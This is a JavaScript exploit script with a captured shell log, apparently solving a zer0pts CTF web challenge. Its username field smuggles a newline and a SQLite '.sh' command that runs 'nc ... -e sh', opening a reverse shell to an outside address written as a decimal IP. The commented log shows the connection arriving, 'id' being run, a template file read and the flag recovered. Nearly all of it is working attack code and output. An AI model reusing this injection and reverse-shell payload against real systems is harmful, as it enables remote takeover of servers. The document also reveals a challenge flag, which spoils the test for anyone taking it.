const url = "http://web.ctf.zer0pts.com:8004"
const username = '";\n.sh nc 2376348879 2 -e sh\n'

fetch(url, {
    method: 'POST',
    body: new URLSearchParams({
        'userName': username,
        'password': 'pocas'
    })
});

/*
root@py:~# nc -lvnp 2
Listening on 0.0.0.0 2
Connection received on 165.227.180.221 38761
id
uid=1000(app) gid=1000(app)
cat templates/index.html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Welcome</title>
    </head>

    <body>
        <h1>Welcome, {{name}}!</h1>
        {% if name == 'admin' %}
        <p>zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}</p>
        {% else %}
        <p>No flag for you :(</p>
        {% endif %}
    </body>
</html>

Output : zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}
*/
